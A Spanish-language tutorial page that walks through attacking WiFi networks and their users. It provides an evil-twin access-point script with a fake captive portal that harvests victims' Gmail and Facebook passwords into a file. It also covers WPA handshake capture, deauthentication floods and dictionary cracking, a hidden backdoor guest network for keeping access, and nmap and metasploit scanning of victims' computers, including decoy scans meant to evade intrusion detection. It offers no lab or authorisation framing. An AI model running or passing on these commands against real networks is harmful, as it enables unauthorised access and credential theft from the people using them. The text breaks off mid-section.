<h3 id="como-implementar-ssl-para-sitios-con-protocolo-hsts-como-facebook-y-gmail">Como implementar SSL para sitios con protocolo HSTS como facebook y gmail.</h3>
<p>Usá este archivo de configuración de apache (<code>/etc/apache2/sites-available</code>)
ports.conf:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span># If you just change the port or add more ports here, you will likely also
</span></span><span style="display:flex;"><span># have to change the VirtualHost statement in
</span></span><span style="display:flex;"><span># /etc/apache2/sites-enabled/000-default.conf
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Listen 80
</span></span><span style="display:flex;"><span>Listen 443
</span></span></code></pre></div><p>Ahora copia esta configuración de 000-default.conf en tu apache
000-default.conf</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;VirtualHost *:80&gt;
</span></span><span style="display:flex;"><span>	ErrorDocument 404 /
</span></span><span style="display:flex;"><span>	# The ServerName directive sets the request scheme, hostname and port that
</span></span><span style="display:flex;"><span>	# the server uses to identify itself. This is used when creating
</span></span><span style="display:flex;"><span>	# redirection URLs. In the context of virtual hosts, the ServerName
</span></span><span style="display:flex;"><span>	# specifies what hostname must appear in the request&#39;s Host: header to
</span></span><span style="display:flex;"><span>	# match this virtual host. For the default virtual host (this file) this
</span></span><span style="display:flex;"><span>	# value is not decisive as it is used as a last resort host regardless.
</span></span><span style="display:flex;"><span>	# However, you must set it for any further virtual host explicitly.
</span></span><span style="display:flex;"><span>	#ServerName www.example.com
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	ServerAdmin webmaster@localhost
</span></span><span style="display:flex;"><span>	DocumentRoot /var/www/html
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
</span></span><span style="display:flex;"><span>	# error, crit, alert, emerg.
</span></span><span style="display:flex;"><span>	# It is also possible to configure the loglevel for particular
</span></span><span style="display:flex;"><span>	# modules, e.g.
</span></span><span style="display:flex;"><span>	#LogLevel info ssl:warn
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	ErrorLog ${APACHE_LOG_DIR}/error.log
</span></span><span style="display:flex;"><span>	CustomLog ${APACHE_LOG_DIR}/access.log combined
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	# For most configuration files from conf-available/, which are
</span></span><span style="display:flex;"><span>	# enabled or disabled at a global level, it is possible to
</span></span><span style="display:flex;"><span>	# include a line for only one particular virtual host. For example the
</span></span><span style="display:flex;"><span>	# following line enables the CGI configuration for this host only
</span></span><span style="display:flex;"><span>	# after it has been globally disabled with &#34;a2disconf&#34;.
</span></span><span style="display:flex;"><span>	#Include conf-available/serve-cgi-bin.conf
</span></span><span style="display:flex;"><span>&lt;/VirtualHost&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;VirtualHost *:443&gt;
</span></span><span style="display:flex;"><span>	SSLEngine On
</span></span><span style="display:flex;"><span>	SSLCertificateFile /root/certs/cert.pem
</span></span><span style="display:flex;"><span>	SSLCertificateKeyFile  /root/certs/cert.key
</span></span><span style="display:flex;"><span>&lt;/VirtualHost&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;Directory &#34;/var/www/html&#34;&gt;
</span></span><span style="display:flex;"><span>	RewriteEngine On
</span></span><span style="display:flex;"><span>	RewriteBase /
</span></span><span style="display:flex;"><span>	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
</span></span><span style="display:flex;"><span>	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	RewriteCond %{REQUEST_FILENAME} !-f
</span></span><span style="display:flex;"><span>	RewriteCond %{REQUEST_FILENAME} !-d
</span></span><span style="display:flex;"><span>	RewriteRule ^(.*)$ / [L,QSA]
</span></span><span style="display:flex;"><span>&lt;/Directory&gt;
</span></span></code></pre></div><p>Ahora ejecutá</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>mkdir /root/certs/
</span></span><span style="display:flex;"><span>openssl req -new -x509 -days 365 -out /root/certs/cert.pem -keyout /root/certs/cert.key # Usá la contraseña 123456, en ciudad, localidad, provincia, nombre de organización, email poné cualquier cosa.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e">## Habilitá los módules en el servidor de apache</span>
</span></span><span style="display:flex;"><span>a2enmod rewrite  
</span></span><span style="display:flex;"><span>a2enmod ssl
</span></span><span style="display:flex;"><span>systemctl restart apache
</span></span></code></pre></div><p>Ejecutá <code>netstat -tan</code> para comprobar que el puerto 443 esté a la escucha.
Ahora intentá ingresar a <code>https://localhost</code></p>
<p>Este es un script que resume lo que vinimos haciendo, para iniciar el ataque ejecuten:</p>
<p>fake-ap-start.sh:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>#!/bin/sh
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>service network-manager stop
</span></span><span style="display:flex;"><span>airmon-ng check kill
</span></span><span style="display:flex;"><span>ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
</span></span><span style="display:flex;"><span>route add default gw 10.0.0.1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</span></span><span style="display:flex;"><span>iptables --flush
</span></span><span style="display:flex;"><span>iptables --table nat --flush
</span></span><span style="display:flex;"><span>iptables --delete-chain
</span></span><span style="display:flex;"><span>iptables --table nat --delete-chain
</span></span><span style="display:flex;"><span>iptables -P FORWARD ACCEPT
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>dnsmasq -C /root/eviltwinfiles/dnsmasq.conf
</span></span><span style="display:flex;"><span>hostapd /root/eviltwinfiles/hostapd.conf -B
</span></span><span style="display:flex;"><span>service apache2 start
</span></span></code></pre></div><p>Ahora si nos conectamos a nuestra WiFi falsa e ingresamos a gmail, yahoo, o facebook nos va a redirigir a nuestro portal cautivo, en donde la victima ingresará su contraseña y se guardará en <code>/var/www/html/passwords.txt</code></p>
<p>Podés ejecutar este script para detener el ataque.</p>
<p>fake-ap-stop.sh</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>service hostapd stop
</span></span><span style="display:flex;"><span>service apache2 stop
</span></span><span style="display:flex;"><span>service dnsmasq stop
</span></span><span style="display:flex;"><span>service rpcbind stop
</span></span><span style="display:flex;"><span>killall dnsmasq
</span></span><span style="display:flex;"><span>killall hostapd
</span></span></code></pre></div><p>Luego <code>service network-manager start</code>
Y tu internet debería volver a funcionar.</p>
<h3 id="capturando-el-handshake">Capturando el handshake</h3>
<p><strong>¿Qué es el handshake?</strong>
Una serie de 4 paquetes intercambiados entre el cliente y el punto de acceso durante un establecimiento de conexión. El handshake contiene la contraseña cifrada. Sólo podemos capturar el handshake cuando el cliente se conecta a la WiFi, no cuando ya está conectado.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>service network-manager stop
</span></span><span style="display:flex;"><span>airmon-ng check kill <span style="color:#75715e"># comprobamos que se mató el proceso</span>
</span></span><span style="display:flex;"><span>airmon-ng start wlan1 <span style="color:#75715e"># o wlan0 para ponerlo en modo monitor, en modo monitor tu internet dejará de funcionar, salvo que tengas dos antenas wifi.</span>
</span></span><span style="display:flex;"><span>iwconfig
</span></span><span style="display:flex;"><span>airmon-ng stop wlan1mon <span style="color:#75715e"># Para detener el modo monitor</span>
</span></span><span style="display:flex;"><span>airodump-ng wlan1mon <span style="color:#75715e"># Para escuchar paquetes (tiene que estar en modo monitor) de ahí elegí la mac address de cualquier red para usarla en el siguiente comando.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ahora podemos crear una carpeta para guardar el handshake
</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>console
</span></span><span style="display:flex;"><span>mkdir handshake
</span></span><span style="display:flex;"><span>cd handshake
</span></span></code></pre></div><h3 id="escuchamos-para-capturar-el-handshake">Escuchamos para capturar el handshake</h3>
<p><code>airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11 --write handshake --output-format cap</code></p>
<p>Cuando el handshake es capturado se guardará en el directorio en donde estás situado.</p>
<h3 id="deautenticamos-a-los-clientes-para-que-se-vuelvan-a-conectar-y-así-capturar-el-handshake-simultáneamente">Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake. (Simultáneamente)</h3>
<p><code>aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.</code></p>
<p>O podés hacerlo sin el cliente <code>sin la opción -c</code> pero agregando <code>-D</code></p>
<h3 id="una-vez-que-capturamos-el-handshake-intentamos-descubrir-la-contraseña-usando-un-diccionario">Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.</h3>
<p><code>aircrack-ng handshake.cap -w passwords.txt</code></p>
<p>En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando <code>wordlists</code>.</p>
<pre tabindex="0"><code>

### Detener la captura del handshake:
```bash
sudo airmon-ng stop wlan1mon (detiene el modo monitor de la wifi)
service network-manager start
</code></pre><h3 id="ataque-de-deautenticacion-y-portal-cautivo">Ataque de deautenticacion y portal cautivo.</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>service network-manager stop
</span></span><span style="display:flex;"><span>airmon-ng check kill
</span></span><span style="display:flex;"><span>airodump-ng start wlan0mon
</span></span><span style="display:flex;"><span>iwconfig <span style="color:#75715e"># Para verificar que nuestra wlan0 esté en monitor mode.</span>
</span></span><span style="display:flex;"><span>airodump-ng wlan0mon
</span></span></code></pre></div><p>Ahora arriba apareceran los SSID y abajo los clientes conectados a esas SSID</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>airodump-ng wlan0mon --bssid direccion_mac_encontrada_con_el_comando_anterior --channel numero_del_canal_encontrado_en_el_comando_anterior
</span></span></code></pre></div><p>Así encontraremos los clientes conectados a esa WiFi.</p>
<p>Ahora los deautenticamos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aireplay-ng --deauth <span style="color:#ae81ff">0</span> -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon
</span></span></code></pre></div><p>Ahora ejecutamos nuestro fake-ap-start.sh</p>
<p>Para detenerlo <code>fake-ap-stop.sh</code> y luego service <code>network-manager start</code></p>
<h3 id="una-vez-que-conseguimos-el-acceso-a-la-wifi-no-deberíamos-perderlo-más">Una vez que conseguimos el acceso a la wifi, no deberíamos perderlo más.</h3>
<p>Una técnica para no perder el acceso puede ser levantar una red wifi invitado OCULTA no difundas el SSID (guest network) y habilitar acceso a través de WPS por PIN.</p>
<h2 id="hackeando-computadoras-una-vez-que-conseguiste-el-acceso">Hackeando computadoras una vez que conseguiste el acceso</h2>
<p>Una vez que conseguimos el acceso a la WiFi, estaría bueno tener acceso también a las computadoras por si las dudas en un futuro cambian la contraseña. Para ello utilizaremos metasploit.
Primero hacemos un escaneo de todas las PCs conectadas a esa WiFi con el siguiente comando.</p>
<h3 id="escanea-todas-las-computadoras-conectadas-a-esa-wifi">Escanea todas las computadoras conectadas a esa wifi</h3>
<p><a href="https://archive.is/wip/vBAQq">https://archive.is/wip/vBAQq</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sP 192.168.1.0/24 <span style="color:#75715e"># Generalmente es 192.168.1 pero puede variar mirá tu ip con el comando ip a</span>
</span></span></code></pre></div><h3 id="o-usando-metasploit">O usando metasploit:</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
</span></span><span style="display:flex;"><span>msf &gt; use auxiliary/scanner/discovery/arp_sweep
</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>arp_sweep<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.1.1/24
</span></span></code></pre></div><p>Más información: <a href="https://thelinuxcode.com/scan-vulnerabilities-metasploit/">https://thelinuxcode.com/scan-vulnerabilities-metasploit/</a><br>
Archive: <a href="https://archive.is/wip/JgyL7">https://archive.is/wip/JgyL7</a></p>
<p>Ahora detectemos que sistema operativo están ejecutando esas computadoras (Android, Windows o Linux para poder encontrar una vulnerabilidad para ese sistema operativo)</p>
<p>Existen varios métodos:
<a href="https://archive.is/wbYBK">https://archive.is/wbYBK</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -O IPs_VICTIMAS_SEPARADAS_POR_ESPACIOS
</span></span></code></pre></div><p>O hacé un escaneo masivo usando: <code>$ nmap -T4 -A 192.168.0.0/24</code></p>
<p>Acá tienen una lista de comandos de tipos de escaneos que pueden realizar con nmap:
<a href="https://archive.is/wip/VisbY">https://archive.is/wip/VisbY</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ curl cheat.sh/
</span></span><span style="display:flex;"><span># Single target scan:
</span></span><span style="display:flex;"><span>nmap [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Scan from a list of targets:
</span></span><span style="display:flex;"><span>nmap -iL [list.txt]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># iPv6:
</span></span><span style="display:flex;"><span>nmap -6 [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># OS detection:
</span></span><span style="display:flex;"><span>nmap -O --osscan_guess [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Save output to text file:
</span></span><span style="display:flex;"><span>nmap -oN [output.txt] [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Save output to xml file:
</span></span><span style="display:flex;"><span>nmap -oX [output.xml] [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Scan a specific port:
</span></span><span style="display:flex;"><span>nmap -source-port [port] [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Do an aggressive scan:
</span></span><span style="display:flex;"><span>nmap -A [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Speedup your scan:
</span></span><span style="display:flex;"><span># -n <span style="color:#f92672">=</span>&gt; disable ReverseDNS
</span></span><span style="display:flex;"><span># --min-rate<span style="color:#f92672">=</span>X <span style="color:#f92672">=</span>&gt; min X packets / sec
</span></span><span style="display:flex;"><span>nmap -T5 --min-parallelism=50 -n --min-rate=300 [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Traceroute:
</span></span><span style="display:flex;"><span>nmap -traceroute [target]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Ping scan only: -sP
</span></span><span style="display:flex;"><span># Don<span style="color:#e6db74">&#39;t ping:     -PN &lt;- Use full if a host don&#39;</span>t reply to a ping.
</span></span><span style="display:flex;"><span># TCP SYN ping:   -PS
</span></span><span style="display:flex;"><span># TCP ACK ping:   -PA
</span></span><span style="display:flex;"><span># UDP ping:       -PU
</span></span><span style="display:flex;"><span># ARP ping:       -PR
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Example: Ping scan all machines on a class C network
</span></span><span style="display:flex;"><span>nmap -sP 192.168.0.0/24
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Force TCP scan: -sT
</span></span><span style="display:flex;"><span># Force UDP scan: -sU
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Use some script:
</span></span><span style="display:flex;"><span>nmap --script default,safe
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Loads the script in the default category, the banner script, and all .nse files in the directory /home/user/customscripts.
</span></span><span style="display:flex;"><span>nmap --script default,banner,/home/user/customscripts
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Loads all scripts whose name starts with http-, such as http-auth and http-open-proxy.
</span></span><span style="display:flex;"><span>nmap --script &#39;http-*&#39;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Loads every script except <span style="color:#66d9ef">for</span> those in the intrusive category.
</span></span><span style="display:flex;"><span>nmap --script &#34;not intrusive&#34;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Loads those scripts that are in both the default and safe categories.
</span></span><span style="display:flex;"><span>nmap --script &#34;default and safe&#34;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Loads scripts in the default, safe, or intrusive categories, except <span style="color:#66d9ef">for</span> those whose names start with http-.
</span></span><span style="display:flex;"><span>nmap --script &#34;(default or safe or intrusive) and not http-*&#34;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Scan <span style="color:#66d9ef">for</span> the heartbleed
</span></span><span style="display:flex;"><span># -pT:443 <span style="color:#f92672">=</span>&gt; Scan only port <span style="color:#ae81ff">443</span> with TCP <span style="color:#f92672">(</span>T:<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>nmap -T5 --min-parallelism=50 -n --script &#34;ssl-heartbleed&#34; -pT:443 127.0.0.1
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Show all informations <span style="color:#f92672">(</span>debug mode<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>nmap -d ...
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Scan <span style="color:#66d9ef">for</span> available SSH connections <span style="color:#f92672">(</span>use root <span style="color:#66d9ef">for</span> additional output<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>nmap -p 22 192.168.0.0/24
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e"># Port Status Information</span>
</span></span><span style="display:flex;"><span>- Open: This indicates that an application is listening for connections on this port.
</span></span><span style="display:flex;"><span>- Closed: This indicates that the probes were received but there is no application listening on this port.
</span></span><span style="display:flex;"><span>- Filtered: This indicates that the probes were not received and the state could not be established. It also indicates that the probes are being dropped by some kind of filtering.
</span></span><span style="display:flex;"><span>- Unfiltered: This indicates that the probes were received but a state could not be established.
</span></span><span style="display:flex;"><span>- Open/Filtered: This indicates that the port was filtered or open but Nmap couldn’t establish the state.
</span></span><span style="display:flex;"><span>- Closed/Filtered: This indicates that the port was filtered or closed but Nmap couldn’t establish the state.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e"># Additional Scan Types</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>nmap -sn: Probe only (host discovery, not port scan)
</span></span><span style="display:flex;"><span>nmap -sS: SYN Scan
</span></span><span style="display:flex;"><span>nmap -sT: TCP Connect Scan
</span></span><span style="display:flex;"><span>nmap -sU: UDP Scan
</span></span><span style="display:flex;"><span>nmap -sV: Version Scan
</span></span><span style="display:flex;"><span>nmap -O: Used for OS Detection/fingerprinting
</span></span><span style="display:flex;"><span>nmap --scanflags: Sets custom list of TCP using `URG ACK PSH RST SYN FIN` in any order
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>#<span style="color:#75715e">## Nmap Scripting Engine Categories</span>
</span></span><span style="display:flex;"><span>The most common Nmap scripting engine categories:
</span></span><span style="display:flex;"><span>- auth: Utilize credentials or bypass authentication on target hosts.
</span></span><span style="display:flex;"><span>- broadcast: Discover hosts not included on command line by broadcasting on local network.
</span></span><span style="display:flex;"><span>- brute: Attempt to guess passwords on target systems, for a variety of protocols, including http, SNMP, IAX, MySQL, VNC, etc.
</span></span><span style="display:flex;"><span>- default: Scripts run automatically when -sC or -A are used.
</span></span><span style="display:flex;"><span>- discovery: Try to learn more information about target hosts through public sources of information, SNMP, directory services, and more.
</span></span><span style="display:flex;"><span>- dos: May cause denial of service conditions in target hosts.
</span></span><span style="display:flex;"><span>- exploit: Attempt to exploit target systems.
</span></span><span style="display:flex;"><span>- external: Interact with third-party systems not included in target list.
</span></span><span style="display:flex;"><span>- fuzzer: Send unexpected input in network protocol fields.
</span></span><span style="display:flex;"><span>- intrusive: May crash target, consume excessive resources, or otherwise impact target machines in a malicious fashion.
</span></span><span style="display:flex;"><span>- malware: Look for signs of malware infection on the target hosts.
</span></span><span style="display:flex;"><span>- safe: Designed not to impact target in a negative fashion.
</span></span><span style="display:flex;"><span>- version: Measure the version of software or protocols on the target hosts.
</span></span><span style="display:flex;"><span>- vul: Measure whether target systems have a known vulnerability.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> tldr:nmap 
</span></span><span style="display:flex;"><span># nmap
</span></span><span style="display:flex;"><span># Network exploration tool and security / port scanner.
</span></span><span style="display:flex;"><span># Some features only activate when Nmap is run with root privileges.
</span></span><span style="display:flex;"><span># More information: &lt;https://nmap.org&gt;.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Check <span style="color:#66d9ef">if</span> an IP address is up, and guess the remote host<span style="color:#960050;background-color:#1e0010">&#39;</span>s operating system:
</span></span><span style="display:flex;"><span>nmap -O ip_or_hostname
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Try to determine whether the specified hosts are up <span style="color:#f92672">(</span>ping scan<span style="color:#f92672">)</span> and what their names are:
</span></span><span style="display:flex;"><span>nmap -sn ip_or_hostname optional_another_address
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Also enable scripts, service detection, OS fingerprinting and traceroute:
</span></span><span style="display:flex;"><span>nmap -A address_or_addresses
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Scan a specific list of ports <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-p-&#39;</span> <span style="color:#66d9ef">for</span> all ports from <span style="color:#ae81ff">1</span> to 65535<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>nmap -p port1,port2,...,portN address_or_addresses
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Perform service and version detection of the top <span style="color:#ae81ff">1000</span> ports using default NSE scripts; writing results <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;-oN&#39;</span><span style="color:#f92672">)</span> to output file:
</span></span><span style="display:flex;"><span>nmap -sC -sV -oN top-1000-ports.txt address_or_addresses
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Scan target<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> carefully using <span style="color:#e6db74">&#39;default and safe&#39;</span> NSE scripts:
</span></span><span style="display:flex;"><span>nmap --script &#34;default and safe&#34; address_or_addresses
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Scan web server running on standard ports <span style="color:#ae81ff">80</span> and <span style="color:#ae81ff">443</span> using all available <span style="color:#e6db74">&#39;http-*&#39;</span> NSE scripts:
</span></span><span style="display:flex;"><span>nmap --script &#34;http-*&#34; address_or_addresses -p 80,443
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Perform a stealthy very slow scan <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;-T0&#39;</span><span style="color:#f92672">)</span> trying to avoid detection by IDS/IPS and use decoy <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;-D&#39;</span><span style="color:#f92672">)</span> source IP addresses:
</span></span><span style="display:flex;"><span>nmap -T0 -D decoy1_ipaddress,decoy2_ipaddress,...,decoyN_ipaddress address_or_addresses
</span></span></code></pre></div><p>Otro tutorial para detectar el sistema operativo de tu víctima usando metasploit<br>
<a href="https://archive.is/wip/MHXYg">OS fingerprinting with Metasploit</a></p>
<p>Dependiendo del sistema operativo que usen y los puertos abiertos tenemos millones de exploits para elegir. Por torrent usando qbittorrent y jackket también podemos encontrar diferentes técnicas para vulnerar Windows 7/8/10. Una de las vulnerabilidades que recuerdo es en el protocolo SAMBA. En YouTube hay miles de videos (muchos borrados sobre como acceder a computadoras con Windows).</p>
<p>Ejemplo detectar sistema operativo de una PC</p>
